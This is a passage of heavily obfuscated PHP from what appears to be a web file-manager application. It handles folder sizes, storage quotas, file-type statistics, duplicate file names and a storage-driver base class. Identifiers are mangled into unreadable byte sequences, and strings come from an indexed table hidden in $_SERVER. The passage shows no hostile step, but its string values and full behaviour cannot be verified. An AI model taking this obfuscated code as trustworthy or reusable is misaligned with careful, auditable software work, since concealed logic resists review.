$¿ÅÛÃä = $this->sourceInfo($»í³¶©); $×§°ğÍİ = $«îĞü©´[2138] . $»í³¶©; CacheLock::lock($×§°ğÍİ, 20); if ($Ò ¯™”¹ === !1) { $this->sourceCacheClear($»í³¶©); $¿ÅÛÃä = $this->sourceInfo($»í³¶©); $ä›Ã¦ñä = array($«îĞü©´[409] => $»í³¶©, $«îĞü©´[438] => 0); $ÀìÎä … = $this->where($ä›Ã¦ñä)->sum($«îĞü©´[76]); $Ò ¯™”¹ = intval($ÀìÎä …) - intval($¿ÅÛÃä[$«îĞü©´[76]]); } if ($Ò ¯™”¹ == 0) { return CacheLock::unlock($×§°ğÍİ); } $èÔõİ¬ = $this->parentLevelArray($¿ÅÛÃä[$«îĞü©´[529]]); if (!$èÔõİ¬) { $èÔõİ¬ = array(); } $èÔõİ¬[] = $¿ÅÛÃä[$«îĞü©´[410]]; $ä›Ã¦ñä = array($«îĞü©´[410] => array($«îĞü©´[426], $èÔõİ¬)); if ($Ò ¯™”¹ < 0) { $ä›Ã¦ñä[$«îĞü©´[76]] = array($«îĞü©´[1023], abs($Ò ¯™”¹)); } $this->where($ä›Ã¦ñä)->setAdd($«îĞü©´[76], $Ò ¯™”¹); CacheLock::unlock($×§°ğÍİ); $ùÙíüñ = $«îĞü©´[2139] . $¿ÅÛÃä[$«îĞü©´[419]] . $«îĞü©´[4] . $¿ÅÛÃä[$«îĞü©´[513]]; $³‰¤ÃóÍ = array($¿ÅÛÃä[$«îĞü©´[419]], $¿ÅÛÃä[$«îĞü©´[513]]); TaskRun::timeLimitCall($ùÙíüñ, $«îĞü©´[2140], $³‰¤ÃóÍ, 1.5); } public function folderSizeResetChildren($¦ÈŒãœë) { $ßñÑ´™š =& $_SERVER[™¾ÇÙ¯¹]; $this->sourceCacheClear($¦ÈŒãœë); $ßîûÄˆÂ = $this->sourceInfo($¦ÈŒãœë); $Í–¾í£Ğ = array($ßñÑ´™š[591] => 1, $ßñÑ´™š[595] => $ßîûÄˆÂ[$ßñÑ´™š[513]], $ßñÑ´™š[598] => array($ßñÑ´™š[558], $ßîûÄˆÂ[$ßñÑ´™š[529]] . $¦ÈŒãœë . $ßñÑ´™š[559])); $‡¨ÅœêË = $ßñÑ´™š[2141]; $è×³ğò÷ = $this->field($‡¨ÅœêË)->where($Í–¾í£Ğ)->select(); $Í–¾í£Ğ[$ßñÑ´™š[418]] = 0; $ŞÆ¤îÜ = $this->field($‡¨ÅœêË)->where($Í–¾í£Ğ)->select(); if (!$ŞÆ¤îÜ) { return; } $è×³ğò÷[] = $ßîûÄˆÂ; $è×³ğò÷ = array_to_keyvalue($è×³ğò÷, $ßñÑ´™š[410]); foreach ($è×³ğò÷ as $±ş÷‡ğ => $¥àÈ­ÏØ) { $è×³ğò÷[$±ş÷‡ğ][$ßñÑ´™š[2142]] = $è×³ğò÷[$±ş÷‡ğ][$ßñÑ´™š[76]]; $è×³ğò÷[$±ş÷‡ğ][$ßñÑ´™š[76]] = 0; } foreach ($ŞÆ¤îÜ as $¥àÈ­ÏØ) { $©òæÉŒœ = $¥àÈ­ÏØ[$ßñÑ´™š[440]] . $ßñÑ´™š[12]; if (!isset($è×³ğò÷[$©òæÉŒœ])) { continue; } if ($¥àÈ­ÏØ[$ßñÑ´™š[439]] == $è×³ğò÷[$©òæÉŒœ][$ßñÑ´™š[439]]) { $è×³ğò÷[$©òæÉŒœ][$ßñÑ´™š[76]] += $¥àÈ­ÏØ[$ßñÑ´™š[76]]; } } foreach ($è×³ğò÷ as $¥àÈ­ÏØ) { $ş“ŒÎµ­ = $this->parentLevelArray($¥àÈ­ÏØ[$ßñÑ´™š[529]]); foreach ($ş“ŒÎµ­ as $©òæÉŒœ) { $©òæÉŒœ = $©òæÉŒœ . $ßñÑ´™š[12]; if (!isset($è×³ğò÷[$©òæÉŒœ])) { continue; } if ($¥àÈ­ÏØ[$ßñÑ´™š[439]] == $è×³ğò÷[$©òæÉŒœ][$ßñÑ´™š[439]]) { $è×³ğò÷[$©òæÉŒœ][$ßñÑ´™š[76]] += $¥àÈ­ÏØ[$ßñÑ´™š[76]]; } } } $±µÁ§ì² = array(); foreach ($è×³ğò÷ as $¥àÈ­ÏØ) { if ($¥àÈ­ÏØ[$ßñÑ´™š[76]] == $¥àÈ­ÏØ[$ßñÑ´™š[2142]]) { continue; } $±µÁ§ì²[] = array($ßñÑ´™š[410], $¥àÈ­ÏØ[$ßñÑ´™š[410]], $ßñÑ´™š[76], $¥àÈ­ÏØ[$ßñÑ´™š[76]]); } $this->saveAll($±µÁ§ì²); } public function userSpaceReset($›ËÃø¬Ë = false) { $³òÆ¯‰ =& $_SERVER[™¾ÇÙ¯¹]; $•ç—»‰ı = $this->where(array($³òÆ¯‰[419] => self::TYPE_USER, $³òÆ¯‰[513] => $›ËÃø¬Ë, $³òÆ¯‰[418] => 0))->sum($³òÆ¯‰[76]); $•ç—»‰ı = !$•ç—»‰ı || $•ç—»‰ı <= 0 ? 0 : $•ç—»‰ı; Model($³òÆ¯‰[521])->userEdit($›ËÃø¬Ë, array($³òÆ¯‰[1826] => $•ç—»‰ı)); } public function targetSpaceUpdate($¤çÙ…îä, $¶Œ‡¬“¥) { $ÄàÙ§¡Ş =& $_SERVER[™¾ÇÙ¯¹]; if (!$¶Œ‡¬“¥) { return; } if (!in_array($¤çÙ…îä, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ËµëìÒ = $this->targetSpaceSize($¤çÙ…îä, $¶Œ‡¬“¥); if ($¤çÙ…îä == self::TYPE_USER) { Model($ÄàÙ§¡Ş[521])->userEdit($¶Œ‡¬“¥, array($ÄàÙ§¡Ş[1826] => $ËµëìÒ)); } else { if ($¤çÙ…îä == self::TYPE_GROUP) { Model($ÄàÙ§¡Ş[530])->groupEdit($¶Œ‡¬“¥, array($ÄàÙ§¡Ş[1826] => $ËµëìÒ)); } } } public function targetSpaceSize($¾¿¿‘ğ¹, $Ğ‰Â£¤¬) { $ã–ôÆé” =& $_SERVER[™¾ÇÙ¯¹]; $¤¶á¹½ò = 0; $­¤Õ†Ì­ = $this->sourceRoot($¾¿¿‘ğ¹, $Ğ‰Â£¤¬, !0); foreach ($­¤Õ†Ì­ as $›“éÅ‡¦) { if (!$›“éÅ‡¦) { continue; } $¤¶á¹½ò += floatval($›“éÅ‡¦[$ã–ôÆé”[76]]); $Ø’ëÜÂ = array($ã–ôÆé”[598] => array($ã–ôÆé”[558], $ã–ôÆé”[539] . $›“éÅ‡¦[$ã–ôÆé”[410]] . $ã–ôÆé”[559])); $½‘ŠÙ•Š = Model($ã–ôÆé”[437])->field($ã–ôÆé”[425])->where($Ø’ëÜÂ)->select(); $½‘ŠÙ•Š = array_to_keyvalue($½‘ŠÙ•Š, $ã–ôÆé”[12], $ã–ôÆé”[410]); $½‘ŠÙ•Š = array_unique(array_filter($½‘ŠÙ•Š)); if ($½‘ŠÙ•Š) { $Ø’ëÜÂ = array($ã–ôÆé”[425] => array($ã–ôÆé”[426], $½‘ŠÙ•Š)); $¤¶á¹½ò += floatval($this->where($Ø’ëÜÂ)->sum($ã–ôÆé”[76])); } } $¤¶á¹½ò = !$¤¶á¹½ò || $¤¶á¹½ò <= 0 ? 0 : $¤¶á¹½ò; return $¤¶á¹½ò; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($—ñÖ„¶) { return $this->fileTypeProfile($—ñÖ„¶, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ü±Ç½º÷) { return $this->fileTypeProfile($ü±Ç½º÷, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Õõ³†Ï„, $ğÉí»­¦) { $ø•±”ÕÙ =& $_SERVER[™¾ÇÙ¯¹]; $Ø÷Ÿû = $ø•±”ÕÙ[2143] . $Õõ³†Ï„ . $ø•±”ÕÙ[11] . $ğÉí»­¦; $öàôà†¢ = Cache::get($Ø÷Ÿû); if ($öàôà†¢) { return $öàôà†¢; } $ûòéöŸ = array($ø•±”ÕÙ[591] => 0); if ($Õõ³†Ï„ != !1) { $ûòéöŸ[$ø•±”ÕÙ[513]] = $Õõ³†Ï„; $ûòéöŸ[$ø•±”ÕÙ[419]] = $ğÉí»­¦; } $—çÑ ’“ = array(); $—çÑ ’“[$ø•±”ÕÙ[2144]] = array($ø•±”ÕÙ[2145] => LNG($ø•±”ÕÙ[2144]), $ø•±”ÕÙ[2146] => $this->where($ûòéöŸ)->count(), $ø•±”ÕÙ[593] => $this->where($ûòéöŸ)->sum($ø•±”ÕÙ[76])); $³ş« ‹Š = KodIO::fileTypeList(); foreach ($³ş« ‹Š as $Éû·•¬ => $™¤ß— °) { $ûòéöŸ[$ø•±”ÕÙ[420]] = $this->fileTypeWhere($Éû·•¬); $—çÑ ’“[$Éû·•¬] = array($ø•±”ÕÙ[2145] => $™¤ß— °[$ø•±”ÕÙ[32]], $ø•±”ÕÙ[2146] => $this->where($ûòéöŸ)->count(), $ø•±”ÕÙ[593] => $this->where($ûòéöŸ)->sum($ø•±”ÕÙ[76])); } Cache::set($Ø÷Ÿû, $—çÑ ’“, 1200); return $—çÑ ’“; } public function fileNameExist($òÌ¦„â‡, $÷¯ÊÁ¦) { $°éã»°” =& $_SERVER[™¾ÇÙ¯¹]; $ßŞì’×à = $this->where(array($°éã»°”[440] => $òÌ¦„â‡, $°éã»°”[32] => $÷¯ÊÁ¦, $°éã»°”[439] => 0))->find(); return is_array($ßŞì’×à) ? $ßŞì’×à[$°éã»°”[410]] : !1; } public function childList($À…«–àÁ) { $úû—Îêš =& $_SERVER[™¾ÇÙ¯¹]; $ıçê˜Ûò = $úû—Îêš[2119] . $À…«–àÁ; if (isset(self::$cacheChildList[$ıçê˜Ûò])) { return self::$cacheChildList[$ıçê˜Ûò]; } $æ–›Óœ = array($úû—Îêš[440] => intval($À…«–àÁ), $úû—Îêš[439] => 0); $¹ÛÖº½… = $this->where($æ–›Óœ)->select(); $¹ÛÖº½… = $¹ÛÖº½… ? $¹ÛÖº½… : array(); self::$cacheChildList[$ıçê˜Ûò] = $¹ÛÖº½…; foreach ($¹ÛÖº½… as $’Ş”‚Ë) { $ıçê˜Ûò = $úû—Îêš[468] . $’Ş”‚Ë[$úû—Îêš[410]]; self::$cacheSourceInfo[$ıçê˜Ûò] = $’Ş”‚Ë; } return $¹ÛÖº½…; } public function fileNameAuto($²—ƒÒ², $æ¡ß—èÄ, $çû¾‹Ş£ = REPEAT_RENAME, $ÈœáòóŒ = false) { $ŸÒšÏ‡ =& $_SERVER[™¾ÇÙ¯¹]; $ Ïşàş• = get_path_ext($æ¡ß—èÄ); $‘î¨ı¾‰ = $ Ïşàş• ? basename($æ¡ß—èÄ, $ŸÒšÏ‡[10] . $ Ïşàş•) . $ŸÒšÏ‡[2147] . $ Ïşàş• : $æ¡ß—èÄ . $ŸÒšÏ‡[392]; $§Îš…İ÷ = array($ŸÒšÏ‡[440] => $²—ƒÒ², $ŸÒšÏ‡[439] => 0, $ŸÒšÏ‡[32] => array($ŸÒšÏ‡[391], $‘î¨ı¾‰)); $Ş“Ò­ËÆ = $this->field($ŸÒšÏ‡[32])->where($§Îš…İ÷)->select(); $šõÜèºï = array_to_keyvalue($Ş“Ò­ËÆ, $ŸÒšÏ‡[12], $ŸÒšÏ‡[32]); return $this->fileNameAutoGet($šõÜèºï, $æ¡ß—èÄ, $çû¾‹Ş£, $ÈœáòóŒ); } public function fileNameAutoGet($÷“˜©Ûê, $ıš¯½×, $ò“‘¢¯ä, $ÓÆµÊó•) { $ı˜¤¥¾ó =& $_SERVER[™¾ÇÙ¯¹]; if ($ò“‘¢¯ä == REPEAT_REPLACE || !$÷“˜©Ûê || !in_array_not_case($ıš¯½×, $÷“˜©Ûê) || $ÓÆµÊó• && $ò“‘¢¯ä != REPEAT_RENAME_FOLDER) { return $ıš¯½×; } if ($ò“‘¢¯ä == REPEAT_SKIP) { return !1; } $®†¡Œéğ = $ı˜¤¥¾ó[10] . get_path_ext($ıš¯½×); $®†¡Œéğ = $®†¡Œéğ == $ı˜¤¥¾ó[10] || $ÓÆµÊó• ? $ı˜¤¥¾ó[12] : $®†¡Œéğ; for ($á˜Šá§Ç = 1; $á˜Šá§Ç <= count($÷“˜©Ûê) + 1; $á˜Šá§Ç++) { $÷ƒÕà»Í = substr($ıš¯½×, 0, strlen($ıš¯½×) - strlen($®†¡Œéğ)); $éÃîöì = $÷ƒÕà»Í . "\50{$á˜Šá§Ç}\51{$®†¡Œéğ}"; if (!in_array_not_case($éÃîöì, $÷“˜©Ûê)) { return $éÃîöì; } } } } goto dÈôˆàèĞ; ešöÎšö¼ø: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Íì¨©«Š =& $_SERVER[™¾ÇÙ¯¹]; $this->objectDriver = array($Íì¨©«Š[60], $Íì¨©«Š[61], $Íì¨©«Š[62], $Íì¨©«Š[63], $Íì¨©«Š[64], $Íì¨©«Š[65], $Íì¨©«Š[66], $Íì¨©«Š[67], $Íì¨©«Š[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($§Åœ¡‹´) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($§Åœ¡‹´, $_SERVER[™¾ÇÙ¯¹][8]); } return $§Åœ¡‹´; } public function iconvApp($×œ×›€õ) { return $×œ×›€õ; } public function iconvSystem($ù•‚âÕµ) { return $ù•‚âÕµ; } public function iconvTo($¾İğĞ, $õğà–Ç, $¿ÜÉ—¼£) { $ÙúÏ­çš =& $_SERVER[™¾ÇÙ¯¹]; if (!$¾İğĞ || !function_exists($ÙúÏ­çš[69])) { return $¾İğĞ; } static $¢¸»ì´È = array(); $±Åœ¬¯ = $õğà–Ç . $ÙúÏ­çš[70] . $¿ÜÉ—¼£ . $ÙúÏ­çš[71] . $¾İğĞ; if (isset($¢¸»ì´È[$±Åœ¬¯])) { return $¢¸»ì´È[$±Åœ¬¯]; } if (function_exists($ÙúÏ­çš[72])) { $óÆ¨üÁ™ = @mb_convert_encoding($¾İğĞ, $¿ÜÉ—¼£, $õğà–Ç); } else { $óÆ¨üÁ™ = @iconv($õğà–Ç, $¿ÜÉ—¼£, $¾İğĞ); } $óÆ¨üÁ™ = $óÆ¨üÁ™ ? $óÆ¨üÁ™ : $¾İğĞ; if (strstr($óÆ¨üÁ™, $ÙúÏ­çš[73])) { $óÆ¨üÁ™ = str_replace($ÙúÏ­çš[73], $ÙúÏ­çš[11], $óÆ¨üÁ™); } $¢¸»ì´È[$õğà–Ç . $ÙúÏ­çš[70] . $¿ÜÉ—¼£ . $ÙúÏ­çš[71] . $¾İğĞ] = $óÆ¨üÁ™; $¢¸»ì´È[$¿ÜÉ—¼£ . $ÙúÏ­çš[70] . $õğà–Ç . $ÙúÏ­çš[71] . $¾İğĞ] = $¾İğĞ; $¢¸»ì´È[$¿ÜÉ—¼£ . $ÙúÏ­çš[70] . $õğà–Ç . $ÙúÏ­çš[71] . $óÆ¨üÁ™] = $¾İğĞ; $¢¸»ì´È[$õğà–Ç . $ÙúÏ­çš[70] . $¿ÜÉ—¼£ . $ÙúÏ­çš[71] . $óÆ¨üÁ™] = $óÆ¨üÁ™; return $óÆ¨üÁ™; } public function getPathInner($âòËÕ†¡) { $Æ§²ğª¡ = IO::init($âòËÕ†¡); return $Æ§²ğª¡->path; } public function getPathOuter($²¯¢º«) { $í¿öâü» =& $_SERVER[™¾ÇÙ¯¹]; $µ¬ã‰¨¾ = strlen(trim($this->pathBase, $í¿öâü»[8])); $²¯¢º« = substr(trim($²¯¢º«, $í¿öâü»[8]), $µ¬ã‰¨¾); return $this->pathDriver . $í¿öâü»[8] . ltrim($²¯¢º«, $í¿öâü»[8]); } public function isParentOf($†ıíöÌ, $©§İ±¼î) { $ß“÷Ûıú =& $_SERVER[™¾ÇÙ¯¹]; $†ıíöÌ = rtrim(strtolower($†ıíöÌ), $ß“÷Ûıú[8]) . $ß“÷Ûıú[8]; $©§İ±¼î = rtrim(strtolower($©§İ±¼î), $ß“÷Ûıú[8]) . $ß“÷Ûıú[8]; $÷î°¾ÊÓ = strpos($©§İ±¼î, $†ıíöÌ) === 0; return $÷î°¾ÊÓ; } public function getType() { $èÃ¥‰¯ =& $_SERVER[™¾ÇÙ¯¹]; $ùéäÚ” = str_replace($èÃ¥‰¯[74], $èÃ¥‰¯[12], get_class($this)); return strtolower($ùéäÚ”); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($€¥µ‚Èë, $ËŸ„»¯®) { $ÄÖŸçÄ’ =& $_SERVER[™¾ÇÙ¯¹]; $¿°¿ÒîÍ = rtrim($€¥µ‚Èë, $ÄÖŸçÄ’[8]) . $ÄÖŸçÄ’[8] . $ËŸ„»¯®; $õÔÖöáş = $this->exist($¿°¿ÒîÍ); return $õÔÖöáş ? $¿°¿ÒîÍ : !1; } public function setModifyTime($î¶¤·öš, $Öªß¹›Ğ = '') { } public function renameObject($€®ñ·Ï©, $µşòàí) { $Ãü­àÖ = $µşòàí; $€®ñ·Ï© = $this->getPathOuter($€®ñ·Ï©); $µşòàí = $this->pathFather($€®ñ·Ï©) . $µşòàí; $¾áêôóä = IO::copy($€®ñ·Ï©, $this->pathFather($€®ñ·Ï©), REPEAT_RENAME_FOLDER, $Ãü­àÖ); if ($¾áêôóä) { IO::remove($€®ñ·Ï©); } return $¾áêôóä ? $µşòàí : !1; } public function tempFile($„ŒÎşêÎ = '', $Ä×áñŸÅ = '') { if (!$„ŒÎşêÎ) { $„ŒÎşêÎ = rand_string(15); } $öœ†€òì = TEMP_FILES . rand_string(15) . $_SERVER[™¾ÇÙ¯¹][8]; @mkdir($öœ†€òì, DEFAULT_PERRMISSIONS, !0); $Ø²şÔ«Ú = $öœ†€òì . $„ŒÎşêÎ; @touch($Ø²şÔ«Ú); if ($Ä×áñŸÅ) { file_put_contents($Ø²şÔ«Ú, $Ä×áñŸÅ); } return $Ø²şÔ«Ú; } public function tempFileRemve($¢ÄŸ¯Ï) { @unlink($¢ÄŸ¯Ï); @rmdir($this->pathFather($¢ÄŸ¯Ï)); } public function mkfile($úø¡ö±Ç, $Òûö³î = '', $†ÄºôÅ = REPEAT_RENAME) { } public function mkdir($İ‹³İşÌ, $æòñÎ±Ï = REPEAT_SKIP) { } public function delFile($–ıª±¯œ) { } public function delFolder($£ÆÙüç) { } public function copyFile($†ÕŒ§Ÿ, $ÌµĞ ¯Ñ) { } public function moveFile($¯ã¸ƒÍá, $ô¼¡˜ú) { } public function remove($ğ« ’–) { if ($this->isFile($ğ« ’–)) { return $this->delFile($ğ« ’–); } return $this->delFolder($ğ« ’–); } public function rename($óË„ÇÁ, $Ö¶ıÓ) { } public function exist($™±³Şƒ¼) { } public function findByHash($áÒ¥»˜ = '', $÷Ù°ƒ©¦ = '') { return !1; } public function isFile($èöğ‘´) { } public function isFolder($±åˆ™»å) { } public function size($‡§€‡) { } public function info($¦ƒÑ–Ôí) { } public function infoSimple($Ãê»šç) { return $this->info($Ãê»šç); } public function infoAuth($éÌı’Æ) { return $this->info($éÌı’Æ); } public function infoFull($ÔÉô¢É) { return $this->info($ÔÉô¢É); } public function infoWithChildren($šÁÑÑõ½) { $ÙÏ¼à„Ğ =& $_SERVER[™¾ÇÙ¯¹]; static $‡ ±ëıÌ = array(); if (isset($‡ ±ëıÌ[$šÁÑÑõ½])) { return $‡ ±ëıÌ[$šÁÑÑõ½]; } $¥ËØ¡¼´ = $this->info($šÁÑÑõ½); if ($¥ËØ¡¼´ && $¥ËØ¡¼´[$ÙÏ¼à„Ğ[33]] == $ÙÏ¼à„Ğ[75]) { $ÑÌ«º‡û = array($ÙÏ¼à„Ğ[76] => 0, $ÙÏ¼à„Ğ[77] => 0, $ÙÏ¼à„Ğ[78] => 0); $this->infoChildren($šÁÑÑõ½, $ÑÌ«º‡û); $¥ËØ¡¼´[$ÙÏ¼à„Ğ[76]] = $ÑÌ«º‡û[$ÙÏ¼à„Ğ[76]]; $¥ËØ¡¼´[$ÙÏ¼à„Ğ[79]] = array($ÙÏ¼à„Ğ[80] => $ÑÌ«º‡û[$ÙÏ¼à„Ğ[77]], $ÙÏ¼à„Ğ[81] => $ÑÌ«º‡û[$ÙÏ¼à„Ğ[78]]); $‡ ±ëıÌ[$šÁÑÑõ½] = $¥ËØ¡¼´; } return $¥ËØ¡¼´; } public function listPath($à¤ÒÊŞ, $©¡ºÖãÒ = false) { } public function has($ó¹ŞÛÑò, $ª¶İèÈ = false, $»Â’ºª = false) { } public function canRead($Ü“°µˆ­) { } public function canWrite($á´–¤ê) { } public function getContent($ÕñºĞÄ¸) { } public function setContent($»Ò·×µö, $˜æ‘ÂøÛ = '') { } protected function infoChildren($‘íäÈ¡, &$åğ¥êû) { $Šä»Óş =& $_SERVER[™¾ÇÙ¯¹]; check_abort_echo(); $ú…ü˜—¿ = $this->listPath($‘íäÈ¡, !0); $ú…ü˜—¿ = array_merge($ú…ü˜—¿[$Šä»Óş[82]], $ú…ü˜—¿[$Šä»Óş[83]]); foreach ($ú…ü˜—¿ as $ˆ€Ä¿êÃ) { if ($ˆ€Ä¿êÃ[$Šä»Óş[33]] == $Šä»Óş[75]) { $åğ¥êû[$Šä»Óş[78]]++; $şËñÆé = $this->getPathInner($ˆ€Ä¿êÃ[$Šä»Óş[84]]); $this->infoChildren($şËñÆé, $åğ¥êû); } else { $åğ¥êû[$Šä»Óş[77]]++; $åğ¥êû[$Šä»Óş[76]] += $ˆ€Ä¿êÃ[$Šä»Óş[76]]; } } } public function fileSubstr($‚ÏÆ„›, $î•ø—‘£, $äÛ…ÏØÏ) { } public function listAll($¥ıºÛ¹©) { } public function listAllMake($Åî£ˆø, &$ÇÖ†¥‰À) { $ËµïŞ´¤ =& $_SERVER[™¾ÇÙ¯¹]; check_abort_echo(); $¹š—È¬ = $this->listPath($Åî£ˆø, !0); if (!$¹š—È¬) { return; } $€¥õµ–º = array_merge($¹š—È¬[$ËµïŞ´¤[82]], $¹š—È¬[$ËµïŞ´¤[83]]); foreach ($€¥õµ–º as $À‘»ÁÒ¶) { $ÑÂÓªöù = $À‘»ÁÒ¶[$ËµïŞ´¤[33]] == $ËµïŞ´¤[75]; $àõ·©”œ = array($ËµïŞ´¤[84] => $À‘»ÁÒ¶[$ËµïŞ´¤[84]], $ËµïŞ´¤[75] => $ÑÂÓªöù); if (isset($À‘»ÁÒ¶[$ËµïŞ´¤[76]])) { $àõ·©”œ[$ËµïŞ´¤[76]] = $À‘»ÁÒ¶[$ËµïŞ´¤[76]]; } if (isset($À‘»ÁÒ¶[$ËµïŞ´¤[85]])) { $àõ·©”œ[$ËµïŞ´¤[85]] = $À‘»ÁÒ¶[$ËµïŞ´¤[85]]; } if (!$ÑÂÓªöù) { $ÇÖ†¥‰À[] = $àõ·©”œ; continue; } $ÇÖ†¥‰À[] = $àõ·©”œ; $„Üì¯íŠ = $À‘»ÁÒ¶[$ËµïŞ´¤[84]]; $íÛÓÅŞ¿ = $this->pathDriver; if (substr($À‘»ÁÒ¶[$ËµïŞ´¤[84]], 0, strlen($íÛÓÅŞ¿)) == $íÛÓÅŞ¿) { $„Üì¯íŠ = substr($„Üì¯íŠ, strlen($íÛÓÅŞ¿)); } $this->listAllMake($„Üì¯íŠ, $ÇÖ†¥‰À); } } public function listAllSimple($õëÈá€) { $ÓàíŸŸØ =& $_SERVER[™¾ÇÙ¯¹]; $½“ŒÕ³Î = array(); $ğ²²çô = $this->listAll($õëÈá€); $˜¬ÚÃÊÏ = $this->getPathOuter($õëÈá€); foreach ($ğ²²çô as $×óËĞ˜¢) { $ãøËï© = $×óËĞ˜¢[$ÓàíŸŸØ[84]]; $æ‡²‹ĞÎ = $×óËĞ˜¢[$ÓàíŸŸØ[84]]; if (isset($×óËĞ˜¢[$ÓàíŸŸØ[86]])) { $ãøËï© = $×óËĞ˜¢[$ÓàíŸŸØ[86]][$ÓàíŸŸØ[84]]; $×óËĞ˜¢[$ÓàíŸŸØ[76]] = $×óËĞ˜¢[$ÓàíŸŸØ[86]][$ÓàíŸŸØ[76]]; $×óËĞ˜¢[$ÓàíŸŸØ[85]] = $×óËĞ˜¢[$ÓàíŸŸØ[86]][$ÓàíŸŸØ[85]]; } else { $æ‡²‹ĞÎ = substr($×óËĞ˜¢[$ÓàíŸŸØ[84]], strlen(get_path_father($˜¬ÚÃÊÏ))); $æ‡²‹ĞÎ = $ÓàíŸŸØ[8] . ltrim($æ‡²‹ĞÎ, $ÓàíŸŸØ[8]); } $êÈôáÀ = array($ÓàíŸŸØ[84] => $æ‡²‹ĞÎ, $ÓàíŸŸØ[75] => $×óËĞ˜¢[$ÓàíŸŸØ[75]]); if (isset($×óËĞ˜¢[$ÓàíŸŸØ[76]]) && !$×óËĞ˜¢[$ÓàíŸŸØ[75]]) { $êÈôáÀ[$ÓàíŸŸØ[76]] = $×óËĞ˜¢[$ÓàíŸŸØ[76]]; } if (isset($×óËĞ˜¢[$ÓàíŸŸØ[85]])) { $êÈôáÀ[$ÓàíŸŸØ[85]] = $×óËĞ˜¢[$ÓàíŸŸØ[85]]; } if (!$×óËĞ˜¢[$ÓàíŸŸØ[75]]) { $êÈôáÀ[$ÓàíŸŸØ[87]] = $ãøËï©; } $½“ŒÕ³Î[] = $êÈôáÀ; } return $½“ŒÕ³Î; } public function upload($µÆ¬¦ñ, $§ŸÔÌç·, $Î‰ğÛÕ¨ = false, $½Ì¶èÆ’ = REPEAT_REPLACE) { } public function uploadFileByID($±íÔä§°, $±×º£úû, $‘³¸İÔÑ) { } public function uploadFileByPath($‘Æ“Ï³È, $ìò¹°èˆ, $ı®†ûÒ = array()) { } public function isUploadServer() { $§õÛ¥Ë£ =& $_SERVER[™¾ÇÙ¯¹]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $§õÛ¥Ë£[88]) { return !0; } return $GLOBALS[$§õÛ¥Ë£[6]][$§õÛ¥Ë£[89]][$§õÛ¥Ë£[90]]; } public function isFileOutServer() { $ŠøÊıÍÚ =& $_SERVER[™¾ÇÙ¯¹]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ŠøÊıÍÚ[88]) { return !0; } return $GLOBALS[$ŠøÊıÍÚ[6]][$ŠøÊıÍÚ[89]][$ŠøÊıÍÚ[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Şñ²í¯¿) { $‚½«ã¨ =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->isCdnHost()) { return $Şñ²í¯¿; } return str_replace(trim(get_url_root($Şñ²í¯¿), $‚½«ã¨[8]), trim($this->cdnHost, $‚½«ã¨[8]), $Şñ²í¯¿); } public function uploadLink($âÍœø…, $å—ßµˆµ = 0) { $äş†’Ö” =& $_SERVER[™¾ÇÙ¯¹]; if ($this->isUploadServer()) { return; } $”Ûæ—×¤ = $this->getType(); if (!in_array($”Ûæ—×¤, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $£˜™¯Ë† = 1024 * 1024 * 10; $¶»ö‰ş£ = $å—ßµˆµ <= $£˜™¯Ë† ? $äş†’Ö”[92] : $äş†’Ö”[93]; $¶Íáˆ¦’ = (!$å—ßµˆµ ? 1 : ceil($å—ßµˆµ / pow(1024, 3))) * 3600 * 4; $—¹¢Í† = $this->{$¶»ö‰ş£}($âÍœø…, $¶Íáˆ¦’); if ($—¹¢Í†) { $—¹¢Í†[$äş†’Ö”[94]] = $âÍœø…; $—¹¢Í†[$äş†’Ö”[95]] = $”Ûæ—×¤; } return $—¹¢Í†; } public function uploadFormData($£ôŠûÜ², $•µÖùéÈ = 3600) { } public function multiUploadFormData($Â‹ğòÑ, $—ç€¬“ó = 3600) { } public function download($Ş¬¬Ôí›, $‚è Ò³‹) { } public function ext($éÛ´ïÅÓ) { $“†Õ½÷Œ =& $_SERVER[™¾ÇÙ¯¹]; if (strpos($éÛ´ïÅÓ, $“†Õ½÷Œ[8]) === -1) { $ª¸ÌšÖ = $éÛ´ïÅÓ; } else { $ª¸ÌšÖ = $this->pathThis($éÛ´ïÅÓ); } $‹™ÛÄôó = $“†Õ½÷Œ[12]; if (strstr($ª¸ÌšÖ, $“†Õ½÷Œ[10])) { $‹™ÛÄôó = substr($ª¸ÌšÖ, strrpos($ª¸ÌšÖ, $“†Õ½÷Œ[10]) + 1); $‹™ÛÄôó = strtolower($‹™ÛÄôó); } if (strlen($‹™ÛÄôó) > 3 && preg_match($“†Õ½÷Œ[96], $‹™ÛÄôó, $òŸ¹®†¤)) { $‹™ÛÄôó = $“†Õ½÷Œ[12]; } return $‹™ÛÄôó; } public function pathThis($û°Ì³ßÍ) { $îì§´Åø =& $_SERVER[™¾ÇÙ¯¹]; $û°Ì³ßÍ = str_replace($îì§´Åø[97], $îì§´Åø[8], rtrim($û°Ì³ßÍ, $îì§´Åø[8])); $Ÿœº†›– = strrpos($û°Ì³ßÍ, $îì§´Åø[8]); if ($Ÿœº†›– === !1) { return $û°Ì³ßÍ; } return substr($û°Ì³ßÍ, $Ÿœº†›– + 1); } public function pathFather($¡ŸÃ‹Ãû) { $â¤÷ì³ =& $_SERVER[™¾ÇÙ¯¹]; $¡ŸÃ‹Ãû = str_replace($â¤÷ì³[97], $â¤÷ì³[8], rtrim($¡ŸÃ‹Ãû, $â¤÷ì³[8])); $µ«²á¦ = strrpos($¡ŸÃ‹Ãû, $â¤÷ì³[8]); if ($µ«²á¦ === !1) { return $â¤÷ì³[12]; } return substr($¡ŸÃ‹Ãû, 0, $µ«²á¦ + 1); } public function hashSimple($¢ÚÅ£ÊÄ) { $İâ¡Ü²¬ =& 